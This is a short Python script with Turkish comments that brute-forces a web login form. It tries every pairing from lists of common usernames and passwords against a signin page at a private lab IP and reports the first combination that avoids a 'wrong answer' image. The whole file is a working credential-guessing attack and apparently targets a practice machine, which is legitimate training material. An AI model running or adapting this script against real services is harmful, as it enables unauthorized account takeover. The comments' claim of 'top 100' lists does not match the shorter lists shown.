import requests

# Top 100 en yaygın kullanıcı adları
common_usernames = [
    'admin','administrator','root','user','test','guest','info','adm','mysql','user1',
    'oracle','ftp','pi','puppet','ansible','ec2-user','vagrant','azureuser','demo',
    'ubuntu','test1','test2','test3','postgres','support','service','backup','joe',
    'john','jane','mike','david','webadmin','www','www-data','mail','email','sales',
    'marketing','help','it','tech','itadmin','sysadmin','dba','manager','director',
    'ceo','cto','dev','developer','devops','deploy','jenkins','git','github','gitlab',
    'docker','kubernetes','admin1','admin2','admin3','operator','sys','system','super',
    'superuser','supervisor','superadmin','sql','mssql','database','dbadmin'
]

# Top 100 en yaygın şifreler
common_passwords = [
    '123456','password','12345678','qwerty','abc123','123456789','111111','1234567',
    'adobe123','123123','admin','1234567890','letmein','photoshop','1234','monkey',
    'shadow','sunshine','password1','princess','azerty','000000','welcome','login',
    'master','hello','freedom','whatever','654321','jordan23','harley','hunter2',
    'password123','zxcvbnm','asdfgh','veronica','buster','123qwe','michelle','scooter',
    'superman','qwerty123','football','1q2w3e4r','1qaz2wsx','zaq1xsw2','xsw2zaq1',
    'welcome1','welcome123','abc123!','admin123','root123','pass123','p@ssw0rd',
    'P@ssw0rd','Qwerty123','admin1','root1','demo123','guest123','user123'
]

# Local test URL'n
TARGET_URL = "http://192.168.75.128/index.php?page=signin"

# Yanıtta bu varsa → yanlış giriş
FAIL_INDICATOR = "images/WrongAnswer.gif"


def try_login(username, password):
    data = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login"
    }

    response = requests.post(TARGET_URL, data=data)
    text = response.text

    # Eğer fail indicator yoksa → giriş başarılı
    return FAIL_INDICATOR not in text


if __name__ == "__main__":
    for username in common_usernames:
        for password in common_passwords:
            print(f"[-] Trying {username}:{password}")

            ok = try_login(username, password)

            if ok:
                print("\n🎉 GİRİŞ BULUNDU!")
                print(f"Username: {username}")
                print(f"Password: {password}\n")
                exit(0)

    print("\n❌ Hiçbir kombinasyon çalışmadı.")
